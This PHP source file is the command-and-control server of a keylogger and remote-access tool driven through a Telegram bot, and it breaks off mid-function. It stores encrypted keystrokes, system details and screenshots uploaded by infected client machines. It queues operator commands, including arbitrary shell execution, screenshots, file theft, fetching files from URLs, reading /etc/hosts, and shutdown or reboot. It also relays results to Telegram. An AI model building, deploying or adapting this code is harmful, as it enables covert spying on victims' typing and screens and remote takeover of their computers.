<?php
require_once __DIR__ . '/Config.php';

class LoggerBot {
    private $pdo;
    private $selectedClient = null;

    public function __construct() {
        $this->initDatabase();
        $this->initDirectories();
    }

    private function initDatabase() {
        try {
            $dsn = "mysql:host=" . Config::$DB_HOST . ";dbname=" . Config::$DB_NAME . ";charset=utf8mb4";
            $this->pdo = new PDO($dsn, Config::$DB_USER, Config::$DB_PASS);
            $this->pdo->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
            $this->pdo->setAttribute(PDO::ATTR_DEFAULT_FETCH_MODE, PDO::FETCH_ASSOC);
        } catch (PDOException $e) {
            $this->logError("Database connection failed: " . $e->getMessage());
            die("Database connection error");
        }
    }

    private function initDirectories() {
        $dirs = [Config::$SCREENSHOT_DIR, Config::$UPLOAD_DIR, dirname(Config::$ERROR_LOG)];
        foreach ($dirs as $dir) {
            if (!is_dir($dir)) {
                mkdir($dir, 0755, true);
            }
        }
    }

    public function handleRequest() {
        $rawInput = file_get_contents('php://input');
        $input = json_decode($rawInput, true) ?: [];
        $this->logWebhook("Raw request: $rawInput, POST: " . json_encode($_POST) . ", FILES: " . json_encode($_FILES));

        if (isset($_SERVER['HTTP_X_TELEGRAM_BOT_API_SECRET_TOKEN']) && 
            $_SERVER['HTTP_X_TELEGRAM_BOT_API_SECRET_TOKEN'] === Config::$WEBHOOK_SECRET) {
            $this->handleWebhook($input);
        } elseif ((isset($_SERVER['HTTP_X_SECRET_TOKEN']) && $_SERVER['HTTP_X_SECRET_TOKEN'] === Config::$SECRET_TOKEN) || 
                 (isset($input['token']) && $input['token'] === Config::$SECRET_TOKEN) || 
                 (isset($_POST['token']) && $_POST['token'] === Config::$SECRET_TOKEN)) {
            $this->handleClientRequest($input);
        } else {
            http_response_code(401);
            $this->logError("Unauthorized access attempt. Headers: " . json_encode($_SERVER));
            die(json_encode(['error' => 'Unauthorized']));
        }
    }

    private function handleWebhook($update) {
        if (!$update) {
            http_response_code(400);
            $this->logError("Invalid webhook request");
            die("Invalid request");
        }

        $this->logWebhook(json_encode($update));
        
        if (isset($update['callback_query'])) {
            $this->handleCallbackQuery($update['callback_query']);
        } elseif (isset($update['message'])) {
            $this->processUpdate($update);
        }
        
        http_response_code(200);
    }

    private function handleCallbackQuery($callbackQuery) {
        $chatId = $callbackQuery['message']['chat']['id'];
        $userId = $callbackQuery['from']['id'];
        $data = $callbackQuery['data'];
        
        if (!$this->isUserAuthorized($userId)) {
            $this->sendTelegramMessage($chatId, "Unauthorized access. Only the admin can issue commands.");
            return;
        }

        list($action, $value) = explode(':', $data, 2);
        
        if ($action === 'select_client') {
            $this->selectedClient = $value;
            $this->sendCommandKeyboard($chatId, "Selected client: $value. Choose a command:");
        } elseif ($action === 'command') {
            if ($this->selectedClient) {
                $response = $this->processCommand($value, $this->selectedClient, true);
                $this->sendTelegramMessage($chatId, "Command '$value' sent to client {$this->selectedClient}: " . json_encode($response['data']));
            } else {
                $this->sendTelegramMessage($chatId, "No client selected. Use /start or /select <client_id>.");
            }
        }

        $this->makeCurlRequest(
            "https://api.telegram.org/bot" . Config::$BOT_TOKEN . "/answerCallbackQuery",
            ['callback_query_id' => $callbackQuery['id']],
            false
        );
    }

    private function handleClientRequest($input) {
        header('Content-Type: application/json');

        // Merge $_POST with $input for multipart/form-data
        $data = array_merge($input, $_POST);
        $this->logWebhook("Client request data: " . json_encode($data));

        $action = $data['action'] ?? null;
        $clientId = $data['client_id'] ?? null;

        if (!$action || !$clientId) {
            http_response_code(400);
            $this->logError("Invalid client request: missing action or client_id. Input: " . json_encode($data));
            die(json_encode(['error' => 'Missing action or client_id']));
        }

        $this->updateClientStatus($clientId);

        switch ($action) {
            case 'get_commands':
                $response = $this->getClientCommands($clientId);
                break;
            case 'upload_data':
                $response = $this->handleUploadData($data);
                break;
            case 'command_response':
                $response = $this->handleCommandResponse($data);
                break;
            default:
                $response = $this->processCommand($action, $clientId, true);
                break;
        }

        echo json_encode($response);
    }

    private function updateClientStatus($clientId) {
        try {
            $ipAddress = $_SERVER['REMOTE_ADDR'] ?? 'unknown';
            $stmt = $this->pdo->prepare(
                "INSERT INTO clients (client_id, ip_address, is_online, last_seen, created_at) 
                VALUES (?, ?, 1, NOW(), NOW()) 
                ON DUPLICATE KEY UPDATE is_online = 1, last_seen = NOW(), ip_address = ?"
            );
            $stmt->execute([$clientId, $ipAddress, $ipAddress]);
            $this->logWebhook("Updated client status for client_id: $clientId, ip: $ipAddress");
        } catch (PDOException $e) {
            $this->logError("Failed to update client status: " . $e->getMessage());
        }
    }

    private function getClientCommands($clientId) {
        try {
            $stmt = $this->pdo->prepare(
                "SELECT id, command FROM client_commands 
                WHERE client_id = ? AND status = 'pending' 
                LIMIT 10"
            );
            $stmt->execute([$clientId]);
            $commands = $stmt->fetchAll();
            $this->logWebhook("Fetched commands for client_id: $clientId, count: " . count($commands));
            return ['commands' => $commands];
        } catch (PDOException $e) {
            $this->logError("Failed to fetch client commands: " . $e->getMessage());
            return ['error' => 'Failed to fetch commands'];
        }
    }

    private function handleUploadData($data) {
        try {
            // Log raw input for debugging
            $this->logWebhook("Upload data: " . json_encode($data) . ", FILES: " . json_encode($_FILES));

            // Validate client_id
            $clientId = $data['client_id'] ?? null;
            if (!$clientId) {
                $this->logError("Upload data failed: Missing client_id");
                http_response_code(400);
                return ['error' => 'Missing client_id'];
            }

            // Validate and decrypt keystrokes
            $keystrokes = '';
            if (isset($data['keystrokes']) && !empty($data['keystrokes'])) {
                $this->logWebhook("Received keystrokes for client_id: $clientId, data: " . substr($data['keystrokes'], 0, 50) . "...");
                $keystrokes = $this->decrypt($data['keystrokes']);
                if ($keystrokes === '') {
                    $this->logError("Keystrokes decryption failed or empty for client_id: $clientId");
                } else {
                    $this->logWebhook("Decrypted keystrokes for client_id: $clientId, length: " . strlen($keystrokes));
                }
            } else {
                $this->logError("No keystrokes provided for client_id: $clientId");
            }

            // Validate and decrypt system_info
            $systemInfo = '';
            if (isset($data['system_info']) && !empty($data['system_info'])) {
                $this->logWebhook("Received system_info for client_id: $clientId, data: " . substr($data['system_info'], 0, 50) . "...");
                $systemInfo = $this->decrypt($data['system_info']);
                if ($systemInfo === '') {
                    $this->logError("System_info decryption failed or empty for client_id: $clientId");
                } else {
                    // Validate JSON format for system_info
                    $jsonCheck = json_decode($systemInfo, true);
                    if (json_last_error() !== JSON_ERROR_NONE) {
                        $this->logError("System_info is not valid JSON for client_id: $clientId, data: " . substr($systemInfo, 0, 50) . "...");
                        $systemInfo = '';
                    } else {
                        $this->logWebhook("Decrypted system_info for client_id: $clientId, length: " . strlen($systemInfo));
                    }
                }
            } else {
                $this->logError("No system_info provided for client_id: $clientId");
            }

            // Handle screenshot
            $screenshotPath = null;
            if (isset($_FILES['screenshot']) && $_FILES['screenshot']['error'] === UPLOAD_ERR_OK) {
                $filename = 'screenshot_' . $clientId . '_' . time() . '.png';
                $screenshotPath = Config::$SCREENSHOT_DIR . $filename;
                if (!move_uploaded_file($_FILES['screenshot']['tmp_name'], $screenshotPath)) {
                    $this->logError("Failed to save screenshot for client_id: $clientId");
                    $screenshotPath = null;
                } else {
                    $this->logWebhook("Saved screenshot for client_id: $clientId at $screenshotPath");
                }
            } else {
                $this->logWebhook("No screenshot provided or upload error for client_id: $clientId");
            }

            // Insert into database
            try {
                $stmt = $this->pdo->prepare(
                    "INSERT INTO user_data (client_id, keystrokes, system_info, screenshot_path, created_at) 
                    VALUES (?, ?, ?, ?, NOW())"
                );
                $stmt->execute([$clientId, $keystrokes, $systemInfo, $screenshotPath]);
                $this->logWebhook("Inserted user_data for client_id: $clientId, keystrokes_len: " . strlen($keystrokes) . ", system_info_len: " . strlen($systemInfo));
            } catch (PDOException $e) {
                $this->logError("Database insertion failed for client_id: $clientId, error: " . $e->getMessage());
                throw new Exception("Database insertion failed: " . $e->getMessage());
            }

            $this->logCommand($clientId, 'upload_data', "Keystrokes: " . strlen($keystrokes) . " chars, System Info: " . strlen($systemInfo));

            return ['status' => 'success'];
        } catch (Exception $e) {
            $this->logError("Upload data failed for client_id: $clientId, error: " . $e->getMessage());
            http_response_code(500);
            return ['error' => 'Upload failed: ' . $e->getMessage()];
        }
    }

    private function handleCommandResponse($data) {
        try {
            $commandId = $data['command_id'] ?? null;
            $result = isset($data['result']) ? $this->decrypt($data['result']) : '';
            if (!$commandId) {
                $this->logError("Missing command_id in command response");
                return ['error' => 'Missing command_id'];
            }

            $stmt = $this->pdo->prepare(
                "UPDATE client_commands SET status = 'completed', result = ?, completed_at = NOW() 
                WHERE id = ?"
            );
            $stmt->execute([$result, $commandId]);
            $this->logWebhook("Updated command response for command_id: $commandId");
            return ['status' => 'success'];
        } catch (PDOException $e) {
            $this->logError("Command response failed: " . $e->getMessage());
            return ['error' => 'Response processing failed'];
        }
    }

    private function processUpdate($update) {
        if (!isset($update['message'])) {
            return;
        }

        $message = $update['message'];
        $chatId = $message['chat']['id'] ?? null;
        $text = $message['text'] ?? '';
        $userId = $message['from']['id'] ?? null;

        if (!$this->isUserAuthorized($userId)) {
            $this->sendTelegramMessage($chatId, "Unauthorized access. Only the admin can issue commands.");
            $this->logError("Unauthorized access attempt by user_id: $userId");
            return;
        }

        // Handle /select command
        if (preg_match('/^\/select\s+(.+)$/', $text, $matches)) {
            $clientId = trim($matches[1]);
            if ($this->clientExists($clientId)) {
                $this->selectedClient = $clientId;
                $this->sendCommandKeyboard($chatId, "Selected client: $clientId. Choose a command:");
                $this->logWebhook("Client selected via /select: $clientId, chat_id: $chatId");
            } else {
                $this->sendTelegramMessage($chatId, "Client ID '$clientId' not found. Use /start to see available clients.");
                $this->logError("Invalid client_id in /select: $clientId, chat_id: $chatId");
            }
            return;
        }

        if (preg_match('/^\/start$/', $text)) {
            $this->sendClientKeyboard($chatId);
        } else {
            if ($this->selectedClient) {
                $response = $this->processCommand($text, $this->selectedClient, true);
                $this->sendTelegramMessage($chatId, "Command '$text' sent to client {$this->selectedClient}: " . json_encode($response['data']));
            } else {
                $this->sendTelegramMessage($chatId, "No client selected. Use /start or /select <client_id>.");
            }
        }
    }

    private function isUserAuthorized($userId) {
        try {
            $stmt = $this->pdo->prepare("SELECT is_admin FROM users WHERE user_id = ? AND is_active = 1");
            $stmt->execute([$userId]);
            $user = $stmt->fetch();
            $isAuthorized = $user && $user['is_admin'] == 1;
            $this->logWebhook("Authorization check for user_id: $userId, authorized: " . ($isAuthorized ? 'yes' : 'no'));
            return $isAuthorized;
        } catch (PDOException $e) {
            $this->logError("Authorization check failed: " . $e->getMessage());
            return false;
        }
    }

    private function clientExists($clientId) {
        try {
            $stmt = $this->pdo->prepare("SELECT 1 FROM clients WHERE client_id = ?");
            $stmt->execute([$clientId]);
            return $stmt->fetch() !== false;
        } catch (PDOException $e) {
            $this->logError("Client existence check failed for client_id: $clientId, error: " . $e->getMessage());
            return false;
        }
    }

    private function sendClientKeyboard($chatId) {
        $clients = $this->getClientStatus();
        $this->logWebhook("Fetched clients for keyboard: " . json_encode($clients));

        if (empty($clients)) {
            $this->sendTelegramMessage($chatId, "No clients registered. Please ensure clients are connected. Use /select <client_id> to select directly.");
            $this->logError("No clients found for keyboard, chat_id: $chatId");
            return;
        }

        $keyboard = ['inline_keyboard' => []];
        $row = [];
        foreach ($clients as $client) {
            $status = $client['is_online'] ? '🟢' : '🔴';
            $ip = $client['ip_address'] ?? 'Unknown';
            $row[] = [
                'text' => "$status {$client['client_id']} ($ip)",
                'callback_data' => "select_client:{$client['client_id']}"
            ];
            if (count($row) == 2) {
                $keyboard['inline_keyboard'][] = $row;
                $row = [];
            }
        }
        if ($row) {
            $keyboard['inline_keyboard'][] = $row;
        }

        $this->logWebhook("Sending client keyboard to chat_id: $chatId, keyboard: " . json_encode($keyboard));
        $response = $this->sendTelegramMessage($chatId, "Select a client:", ['reply_markup' => $keyboard]);
        $this->logWebhook("Telegram API response for keyboard: " . $response);
    }

    private function sendCommandKeyboard($chatId, $message) {
        $commands = [
            '/status' => 'System Status',
            '/screenshot' => 'Take Screenshot',
            '/upload' => 'Upload File',
            '/exec' => 'Execute Command',
            '/logs' => 'View Logs',
            '/hosts' => 'View Hosts',
            '/screens' => 'List Screenshots',
            '/browse' => 'Browse Directory',
            '/get-info' => 'System Info',
            '/go' => 'Open URL',
            '/shutdown' => 'Shutdown',
            '/test_telegram' => 'Test Telegram',
            '/upload_file' => 'Upload File',
            '/upload_url' => 'Upload from URL',
            '/tasks' => 'List Tasks',
            '/startup' => 'Manage Startup',
            '/signout' => 'Sign Out',
            '/sleep' => 'Sleep',
            '/restart' => 'Restart',
            '/listusers' => 'List Users',
            '/addadmin' => 'Add Admin'
        ];

        $keyboard = ['inline_keyboard' => []];
        $row = [];
        foreach ($commands as $cmd => $label) {
            $row[] = ['text' => $label, 'callback_data' => "command:$cmd"];
            if (count($row) == 2) {
                $keyboard['inline_keyboard'][] = $row;
                $row = [];
            }
        }
        if ($row) {
            $keyboard['inline_keyboard'][] = $row;
        }

        $this->logWebhook("Sending command keyboard to chat_id: $chatId, keyboard: " . json_encode($keyboard));
        $this->sendTelegramMessage($chatId, $message, ['reply_markup' => $keyboard]);
    }

    private function processCommand($command, $recipient, $isClient = false) {
        $command = trim($command);
        $this->logCommand($recipient, $command);

        $response = ['status' => 'success', 'data' => ''];
        switch (true) {
            case preg_match('/^\/start$/', $command):
                $response['data'] = $isClient ? "Started" : $this->sendClientKeyboard($recipient);
                break;

            case preg_match('/^\/status$/', $command):
                $response['data'] = $this->sendSystemStatus($recipient, $isClient);
                break;

            case preg_match('/^\/screenshot$/', $command):
                $response['data'] = $this->handleScreenshot($recipient, $isClient);
                break;

            case preg_match('/^\/upload (.+)/', $command, $matches):
            case preg_match('/^\/upload_file (.+)/', $command, $matches):
                $response['data'] = $this->handleFileUpload($recipient, $matches[1], $isClient);
                break;

            case preg_match('/^\/exec (.+)/', $command, $matches):
                $response['data'] = $this->executeCommand($recipient, $matches[1], $isClient);
                break;

            case preg_match('/^\/logs$/', $command):
                $response['data'] = $this->sendLogs($recipient, $isClient);
                break;

            case preg_match('/^\/addadmin (\d+)$/', $command, $matches):
                if ($recipient == Config::$ADMIN_CHAT_ID) {
                    $response['data'] = $this->addAdmin($recipient, $matches[1], $isClient);
                } else {
                    $response = ['status' => 'error', 'data' => 'Only the primary admin can add admins.'];
                }
                break;

            case preg_match('/^\/listusers$/', $command):
                $response['data'] = $this->listUsers($recipient, $isClient);
                break;

            case preg_match('/^\/hosts$/', $command):
                $response['data'] = $this->getHosts($recipient, $isClient);
                break;

            case preg_match('/^\/screens$/', $command):
                $response['data'] = $this->listScreenshots($recipient, $isClient);
                break;

            case preg_match('/^\/browse (.+)/', $command, $matches):
                $response['data'] = $this->browseDirectory($recipient, $matches[1], $isClient);
                break;

            case preg_match('/^\/get-info$/', $command):
                $response['data'] = $this->getSystemInfo($recipient, $isClient);
                break;

            case preg_match('/^\/go (.+)/', $command, $matches):
                $response['data'] = $this->goToUrl($recipient, $matches[1], $isClient);
                break;

            case preg_match('/^\/shutdown$/', $command):
                $response['data'] = $this->systemShutdown($recipient, $isClient);
                break;

            case preg_match('/^\/test_telegram$/', $command):
                $response['data'] = $this->testTelegram($recipient, $isClient);
                break;

            case preg_match('/^\/upload_url (.+)/', $command, $matches):
                $response['data'] = $this->uploadFromUrl($recipient, $matches[1], $isClient);
                break;

            case preg_match('/^\/tasks$/', $command):
                $response['data'] = $this->listTasks($recipient, $isClient);
                break;

            case preg_match('/^\/startup$/', $command):
                $response['data'] = $this->manageStartup($recipient, $isClient);
                break;

            case preg_match('/^\/signout$/', $command):
                $response['data'] = $this->signOut($recipient, $isClient);
                break;

            case preg_match('/^\/sleep$/', $command):
                $response['data'] = $this->systemSleep($recipient, $isClient);
                break;

            case preg_match('/^\/restart$/', $command):
                $response['data'] = $this->systemRestart($recipient, $isClient);
                break;

            default:
                $response['data'] = $this->sendHelpMessage($recipient, $isClient);
                break;
        }

        if ($isClient && $response['status'] === 'success') {
            $this->queueClientCommand($recipient, $command, json_encode($response['data']));
        }

        return $response;
    }

    private function queueClientCommand($clientId, $command, $response) {
        try {
            $encryptedCommand = $this->encrypt(json_encode(['type' => $command, 'params' => []]));
            $stmt = $this->pdo->prepare(
                "INSERT INTO client_commands (client_id, command, status, created_at) 
                VALUES (?, ?, 'pending', NOW())"
            );
            $stmt->execute([$clientId, $encryptedCommand]);
            $this->logWebhook("Queued command for client_id: $clientId, command: $command");
        } catch (PDOException $e) {
            $this->logError("Failed to queue client command: " . $e->getMessage());
        }
    }

    private function encrypt($data) {
        $iv = openssl_random_pseudo_bytes(16);
        $ciphertext = openssl_encrypt(
            $data,
            'aes-256-cbc',
            base64_decode(Config::$ENCRYPTION_KEY),
            0,
            $iv
        );
        if ($ciphertext === false) {
            $this->logError("Encryption failed for data: " . substr($data, 0, 50) . "...");
            return '';
        }
        return $ciphertext . '::' . base64_encode($iv);
    }

    private function decrypt($encryptedData) {
        try {
            if (!$encryptedData || !is_string($encryptedData)) {
                $this->logError("Invalid encrypted data: Not a string or empty: " . json_encode($encryptedData));
                return '';
            }

            if (!str_contains($encryptedData, '::')) {
                $this->logError("Invalid encrypted data format: Missing '::' separator: " . substr($encryptedData, 0, 50) . "...");
                return '';
            }

            list($ciphertext, $iv) = explode('::', $encryptedData, 2);
            if (empty($ciphertext) || empty($iv)) {
                $this->logError("Invalid encrypted data: Empty ciphertext or IV: " . substr($encryptedData, 0, 50) . "...");
                return '';
            }

            $ivDecoded = base64_decode($iv, true);
            if ($ivDecoded === false || strlen($ivDecoded) !== 16) {
                $this->logError("Invalid IV: Failed to decode or incorrect length: $iv");
                return '';
            }

            $key = base64_decode(Config::$ENCRYPTION_KEY);
            if (!$key) {
                $this->logError("Invalid encryption key: Failed to decode Config::$ENCRYPTION_KEY");
                return '';
            }

            $decrypted = openssl_decrypt(
                $ciphertext,
                'aes-256-cbc',
                $key,
                0,
                $ivDecoded
            );

            if ($decrypted === false) {
                $this->logError("Decryption failed for data: " . substr($encryptedData, 0, 50) . "...");
                return '';
            }

            $this->logWebhook("Successfully decrypted data: " . substr($decrypted, 0, 50) . "...");
            return $decrypted;
        } catch (Exception $e) {
            $this->logError("Decryption error: " . $e->getMessage() . ", data: " . substr($encryptedData, 0, 50) . "...");
            return '';
        }
    }

    private function sendTelegramMessage($chatId, $text, $options = []) {
        $url = "https://api.telegram.org/bot" . Config::$BOT_TOKEN . "/sendMessage";
        $data = array_merge([
            'chat_id' => $chatId,
            'text' => $text,
            'parse_mode' => 'Markdown'
        ], $options);

        // Ensure reply_markup is JSON-encoded
        if (isset($data['reply_markup'])) {
            $data['reply_markup'] = json_encode($data['reply_markup']);
        }

        $this->logWebhook("Sending Telegram message to chat_id: $chatId, payload: " . json_encode($data));
        $response = $this->makeCurlRequest($url, $data, false);
        $this->logWebhook("Telegram sendMessage response: " . $response);
        return $response;
    }

    private function sendTelegramFile($chatId, $filePath, $method = 'sendDocument') {
        $url = "https://api.telegram.org/bot" . Config::$BOT_TOKEN . "/$method";
        $data = [
            'chat_id' => $chatId,
            $method == 'sendPhoto' ? 'photo' : 'document' => new CURLFile($filePath)
        ];
        $this->logWebhook("Sending Telegram file to chat_id: $chatId, method: $method, file: $filePath");
        $response = $this->makeCurlRequest($url, $data, true);
        $this->logWebhook("Telegram sendFile response: " . $response);
        return $response;
    }

    private function makeCurlRequest($url, $data, $isFile = false) {
        $ch = curl_init($url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_POST, true);
        curl_setopt($ch, CURLOPT_HTTPHEADER, ['Content-Type: application/json']);

        if ($isFile) {
            curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
        } else {
            // Send raw JSON payload for non-file requests
            curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($data));
        }
        
        $response = curl_exec($ch);
        if (curl_errno($ch)) {
            $this->logError("cURL error: " . curl_error($ch) . ", URL: $url");
        }
        curl_close($ch);
        return $response;
    }

    private function getClientStatus() {
        try {
            $stmt = $this->pdo->prepare("SELECT client_id, ip_address, is_online, last_seen FROM clients WHERE last_seen > NOW() - INTERVAL 1 HOUR");
            $stmt->execute();
            $clients = $stmt->fetchAll();
            $this->logWebhook("Client status query returned: " . json_encode($clients));
            return $clients;
        } catch (PDOException $e) {
            $this->logError("Failed to get client status: " . $e->getMessage());
            return [];
        }
    }

    private function sendSystemStatus($recipient, $isClient = false) {
        $status = [
            'uptime' => exec('uptime'),
            'disk_space' => disk_free_space(__DIR__) / disk_total_space(__DIR__) * 100,
            'memory' => memory_get_usage(true) / 1024 / 1024 . ' MB'
        ];

        $message = "System Status:\n" .
                  "Uptime: {$status['uptime']}\n" .
                  "Disk Space: " . number_format($status['disk_space'], 2) . "% free\n" .
                  "Memory Usage: {$status['memory']}";

        if ($isClient) {
            return $message;
        }
        $this->sendTelegramMessage($recipient, $message);
        return "Status sent";
    }

    private function handleScreenshot($recipient, $isClient = false) {
        $filename = Config::$SCREENSHOT_DIR . 'screenshot_' . time() . '.png';
        $command = "scrot $filename";
        exec($command, $output, $return_var);

        if ($return_var === 0 && file_exists($filename)) {
            if ($isClient) {
                $content = base64_encode(file_get_contents($filename));
                unlink($filename);
                return ['filename' => basename($filename), 'content' => $content];
            }
            $this->sendTelegramFile($recipient, $filename, 'sendPhoto');
            unlink($filename);
            return "Screenshot sent";
        }
        $message = 'Failed to take screenshot';
        if ($isClient) {
            return $message;
        }
        $this->sendTelegramMessage($recipient, $message);
        return $message;
    }

    private function handleFileUpload($recipient, $filePath, $isClient = false) {
        $fullPath = Config::$UPLOAD_DIR . basename($filePath);
        
        if (file_exists($fullPath)) {
            if ($isClient) {
                $content = base64_encode(file_get_contents($fullPath));
                return ['filename' => basename($fullPath), 'content' => $content];
            }
            $this->sendTelegramFile($recipient, $fullPath);
            return "File uploaded";
        }
        $message = 'File not found';
        if ($isClient) {
            return $message;
        }
        $this->sendTelegramMessage($recipient, $message);
        return $message;
    }

    private function executeCommand($recipient, $command, $isClient = false) {
        $startTime = time();
        $descriptors = [
            1 => ['pipe', 'w'],
            2 => ['pipe', 'w']
        ];
        
        $process = proc_open($command, $descriptors, $pipes);
        
        if (is_resource($process)) {
            stream_set_timeout($pipes[1], Config::$COMMAND_TIMEOUT);
            stream_set_timeout($pipes[2], Config::$COMMAND_TIMEOUT);
            
            $output = stream_get_contents($pipes[1]);
            $errors = stream_get_contents($pipes[2]);
            
            fclose($pipes[1]);
            fclose($pipes[2]);
            proc_close($process);

            $response = empty($errors) ? $output : "Error: $errors";
            
            $encrypted = $this->encrypt($response);
            
            if ($isClient) {
                return ['output' => $encrypted];
            }
            $this->sendTelegramMessage($recipient, $encrypted ?: 'Command execution failed');
            $this->logCommand($recipient, $command, $response);
            return "Command executed";
        }
        $message = 'Failed to execute command';
        if ($isClient) {
            return $message;
        }
        $this->sendTelegramMessage($recipient, $message);
        return $message;
    }

    private function sendLogs($recipient, $isClient = false) {
        $logFiles = [
            Config::$ERROR_LOG,
            Config::$WEBHOOK_LOG,
            Config::$TELEGRAM_LOG
        ];
        $results = [];

        foreach ($logFiles as $logFile) {
            if (file_exists($logFile) && filesize($logFile) <= Config::$MAX_LOG_SIZE) {
                if ($isClient) {
                    $results[] = [
                        'filename' => basename($logFile),
                        'content' => base64_encode(file_get_contents($logFile))
                    ];
                } else {
                    $this->sendTelegramFile($recipient, $logFile);
                }
            }
        }

        if ($isClient) {
            return $results ?: 'No logs available';
        }
        return "Logs sent";
    }

    private function getHosts($recipient, $isClient = false) {
        $hostsFile = '/etc/hosts';
        if (file_exists($hostsFile)) {
            $content = file_get_contents($hostsFile);
            if ($isClient) {
                return ['content' => $content];
            }
            $this->sendTelegramMessage($recipient, "Hosts file:\n$content");
            return "Hosts file sent";
        }
        $message = 'Hosts file not found';
        if ($isClient) {
            return $message;
        }
        $this->sendTelegramMessage($recipient, $message);
        return $message;
    }

    private function listScreenshots($recipient, $isClient = false) {
        $files = glob(Config::$SCREENSHOT_DIR . '*.png');
        $fileList = array_map('basename', $files);
        $message = "Screenshots:\n" . (empty($fileList) ? "No screenshots found" : implode("\n", $fileList));

        if ($isClient) {
            return ['files' => $fileList];
        }
        $this->sendTelegramMessage($recipient, $message);
        return "Screenshot list sent";
    }

    private function browseDirectory($recipient, $path, $isClient = false) {
        $safePath = realpath(Config::$UPLOAD_DIR . '/' . $path);
        if ($safePath && strpos($safePath, Config::$UPLOAD_DIR) === 0 && is_dir($safePath)) {
            $files = scandir($safePath);
            $fileList = array_filter($files, fn($file) => $file !== '.' && $file !== '..');
            $message = "Directory $path:\n" . (empty($fileList) ? "Empty directory" : implode("\n", $fileList));

            if ($isClient) {
                return ['files' => $fileList];
            }
            $this->sendTelegramMessage($recipient, $message);
            return "Directory listing sent";
        }
        $message = 'Invalid or inaccessible directory';
        if ($isClient) {
            return $message;
        }
        $this->sendTelegramMessage($recipient, $message);
        return $message;
    }

    private function getSystemInfo($recipient, $isClient = false) {
        $info = [
            'os' => php_uname(),
            'php_version' => phpversion(),
            'server_software' => $_SERVER['SERVER_SOFTWARE'] ?? 'Unknown',
            'disk_total' => disk_total_space(__DIR__) / 1024 / 1024 / 1024 . ' GB',
            'disk_free' => disk_free_space(__DIR__) / 1024 / 1024 / 1024 . ' GB'
        ];

        $message = "System Info:\n" . implode("\n", array_map(fn($k, $v) => "$k: $v", array_keys($info), $info));

        if ($isClient) {
            return $info;
        }
        $this->sendTelegramMessage($recipient, $message);
        return "System info sent";
    }

    private function goToUrl($recipient, $url, $isClient = false) {
        $command = "xdg-open " . escapeshellarg($url);
        exec($command, $output, $return_var);

        $message = $return_var === 0 ? "Opened URL: $url" : "Failed to open URL";
        if ($isClient) {
            return $message;
        }
        $this->sendTelegramMessage($recipient, $message);
        return $message;
    }

    private function systemShutdown($recipient, $isClient = false) {
        exec('sudo shutdown -h now', $output, $return_var);
        $message = $return_var === 0 ? "System shutting down" : "Failed to shutdown";
        if ($isClient) {
            return $message;
        }
        $this->sendTelegramMessage($recipient, $message);
        return $message;
    }

    private function testTelegram($recipient, $isClient = false) {
        $response = $this->makeCurlRequest("https://api.telegram.org/bot" . Config::$BOT_TOKEN . "/getMe", [], false);
        $message = json_decode($response, true)['ok'] ? "Telegram API is working" : "Telegram API test failed";

        if ($isClient) {
            return $message;
        }
        $this->sendTelegramMessage($recipient, $message);
        return $message;
    }

    private function uploadFromUrl($recipient, $url, $isClient = false) {
        $filename = Config::$UPLOAD_DIR . 'downloaded_' . time() . '_' . basename($url);
        $content = file_get_contents($url);
        if ($content !== false && file_put_contents($filename, $content)) {
            if ($isClient) {
                $content = base64_encode(file_get_contents($filename));
                unlink($filename);
                return ['filename' => basename($filename), 'content' => $content];
            }
            $this->sendTelegramFile($recipient, $filename);
            unlink($filename);
            return "File uploaded from URL";
        }
        $message = "Failed to download from URL";
        if ($isClient) {
            return $message;
        }
        $this->sendTelegramMessage($recipient, $message);
        return $message;
    }

    private function listTasks($recipient, $isClient = false) {
        exec('ps aux', $output);
        $tasks = implode("\n", $output);
        $message = "Running tasks:\n" . ($tasks ?: "No tasks found");

        if ($isClient) {
            return ['tasks' => $tasks];
        }
        $this->sendTelegramMessage($recipient, $message);
        return "Tasks listed";
    }

    private function manageStartup($recipient, $isClient = false) {
        $message = "Startup management not fully implemented. Check crontab or systemd services.";
        if ($isClient) {
            return $message;
        }
        $this->sendTelegramMessage($recipient, $message);
        return $message;
    }

    private function signOut($recipient, $isClient = false) {
        $message = "Sign out not fully implemented. Requires system-specific user session management.";
        if ($isClient) {
            return $message;
        }
        $this->sendTelegramMessage($recipient, $message);
        return $message;
    }

    private function systemSleep($recipient, $isClient = false) {
        exec('sudo systemctl suspend', $output, $return_var);
        $message = $return_var === 0 ? "System entering sleep mode" : "Failed to enter sleep mode";
        if ($isClient) {
            return $message;
        }
        $this->sendTelegramMessage($recipient, $message);
        return $message;
    }

    private function systemRestart($recipient, $isClient = false) {
        exec('sudo reboot', $output, $return_var);
        $message = $return_var === 0 ? "System restarting" : "Failed to restart";
        if ($isClient) {
            return $message;
        }
        $this->sendTelegramMessage($recipient, $message);
        return $message;
    }

    private function addAdmin($recipient, $newAdminId, $isClient = false) {
        try {
            $stmt = $this->pdo->prepare(
                "INSERT INTO users (user_id, is_active, is_admin, created_at) 
                VALUES (?, 1, 1, NOW()) 
                ON DUPLICATE KEY UPDATE is_admin = 1, is_active = 1"
            );
            $stmt->execute([$newAdminId]);
            $message = "Admin $newAdminId added successfully.";
        } catch (PDOException $e) {
            $message = "Failed to add admin: " . $e->getMessage();
            $this->logError("Add admin failed: " . $e->getMessage());
        }

        if ($isClient) {
            return $message;
        }
        $this->sendTelegramMessage($recipient, $message);
        return $message;
    }

    private function listUsers($recipient, $isClient = false) {
        try {
            $stmt = $this->pdo->prepare("SELECT user_id, is_admin FROM users WHERE is_active = 1");
            $stmt->execute();
            $users = $stmt->fetchAll();
            
            $message = "Active users:\n";
            foreach ($users as $user) {
                $role = $user['is_admin'] ? '(Admin)' : '(User)';
                $message .= "- {$user['user_id']} $role\n";
            }
            $message = $message ?: "No active users.";
        } catch (PDOException $e) {
            $message = "Failed to list users: " . $e->getMessage();
            $this->logError("List users failed: " . $e->getMessage());
        }

        if ($isClient) {
            return $message;
        }
        $this->sendTelegramMessage($recipient, $message);
        return "Users listed";
    }

    private function logCommand($recipient, $command, $response = '') {
        try {
            $userId = $recipient;
            if (isset($GLOBALS['update']['message']['from']['id'])) {
                $userId = $GLOBALS['update']['message']['from']['id'];
            }
            $stmt = $this->pdo->prepare(
                "INSERT INTO command_logs (chat_id, user_id, command, response, created_at) 
                VALUES (?, ?, ?, ?, NOW())"
            );
